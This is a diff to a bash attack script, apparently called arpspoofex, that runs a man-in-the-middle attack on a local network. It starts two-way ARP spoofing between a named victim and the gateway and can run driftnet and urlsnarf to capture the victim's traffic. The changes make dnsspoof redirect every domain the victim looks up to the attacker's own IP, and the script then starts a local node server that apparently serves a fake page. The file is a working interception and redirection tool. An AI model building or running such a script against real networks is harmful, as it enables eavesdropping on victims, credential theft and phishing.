@@ -9,8 +9,9 @@
 #===============================================================================================
 
 RCFILE="/tmp/arpspoofex.rc"
+NGINXCONF="/tmp/nginx-fake.conf"
 
-while getopts "hnduv:r:i:s:" opt 
+while getopts "hndusv:r:i:" opt 
 do
 	case $opt in
 		h)	# Help
@@ -52,7 +53,7 @@ do
 			URLSNARF=true
 		;;
 		s)	# Dnsspoof
-			DNSSPOOF=$OPTARG
+			DNSSPOOF=true
 		;;
 	esac
 done
@@ -91,7 +92,8 @@ echo $FORWARD > /proc/sys/net/ipv4/ip_forward
 
 echo "startup_message off" > $RCFILE
 echo -e "caption always \"%{= kw}%-w%{= BW}%n %t%{-}%+w %-= @%H - %LD %d %LM - %c\"" >> $RCFILE
-echo -e "screen -t arpspoof arpspoof -i $INTERFACE -r -t $GATEWAY $VICTIM" >> $RCFILE
+echo -e "screen -t arpspoof1 arpspoof -i $INTERFACE -t $GATEWAY $VICTIM" >> $RCFILE
+echo -e "screen -t arpspoof2 arpspoof -i $INTERFACE -t $VICTIM $GATEWAY" >> $RCFILE
 
 if [ "$DRIFTNET" == "true" ]
 then
@@ -103,9 +105,16 @@ then
 	echo -e "screen -t urlsnarf urlsnarf -i $INTERFACE" >> $RCFILE
 fi
 
-if [ ! -z "$DNSSPOOF" ]
+if [ "$DNSSPOOF" == "true" ]
 then
-	echo -e "screen -t dnsspoof dnsspoof -i $INTERFACE -f $DNSSPOOF host $VICTIM and udp port 53" >> $RCFILE
+	# Set up DNS spoofing
+	IP=`ifconfig $INTERFACE | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
+	echo "$IP *" > /tmp/spoofhosts.txt
+	echo -e "screen -t dnsspoof dnsspoof -i $INTERFACE -f /tmp/spoofhosts.txt host $VICTIM and udp port 53" >> $RCFILE
+	
+	# Set up nginx webpage
+	# echo -e "screen -t nginx nginx -c $PWD/nginx-test.conf" >> $RCFILE	
+        echo -e "screen -t node nodejs server.js" >> $RCFILE	
 fi
 
 echo -e "screen -r -t Main" >> $RCFILE
